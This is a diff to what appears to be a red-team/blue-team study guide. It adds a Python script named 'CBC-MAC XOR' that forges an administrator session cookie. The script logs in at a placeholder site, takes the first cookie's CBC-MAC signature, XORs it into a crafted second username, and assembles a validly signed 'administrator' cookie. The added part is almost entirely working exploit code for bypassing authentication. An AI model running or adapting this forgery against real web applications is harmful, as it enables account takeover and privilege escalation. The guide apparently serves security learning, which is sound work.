@@ -421,6 +421,7 @@ pip install -r requirements.txt
 26. [ZIPFILE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#zipfile)
 27. [BINARY2ASCII](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#binary2ascii)
 28. [AES-CBC-PKCS55PADDING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#aes-cbc-pkcs5padding)
+29. [CBC-MAC XOR](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#cbc-mac-xor)
 
 <br />
 
@@ -1001,4 +1002,33 @@ print("Key: ", decrypt(secretKey, iv))
 #output: Key:  b'dfffb3d4-e1a6-49b0-a667-4533a1b3fbcb\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c'
 # ord("\x0c") = 12 --> 48 - len(Key) = 12 (...,thus padding of 12 needed)
 # The padding mechanism fills the final string by n-times the value n , i.e. 12 x "\x0c"
+```
+
+### CBC-MAC XOR
+```
+import requests
+import base64
+
+def login(username):
+    url = "https://example.com"
+    data = {"username":username, "password":"password"}
+    r1 = requests.post(url+"/login.php", data=data, allow_redirects=False)
+    r2 = requests.get(url+"/index.php")
+    return r1.headers['set-cookie'].split("=")[1]
+
+
+def xor(a, b):
+    return ''.join(chr(ord(a[i]) ^ ord(b[i])) for i in range(0,8))
+
+
+cookie1 = login("administ").encode()
+signature1 = str(base64.b64decode(cookie1)).split("--")[1].strip("'")
+#username2 = xor("administ", "\00\00\00\00\00\00\00\00") --> returns "administ" --> POC
+username2 = xor("rator\00\00\00", signature1)
+
+cookie2 = login(username2).encode()
+signature2 = str(base64.b64decode(cookie2)).split("--")[1].strip("'")
+cookie3 = 'administrator--' + signature2
+cookie3 = base64.b64encode(cookie3.encode()).decode().strip("=")
+print(cookie3)
 ```
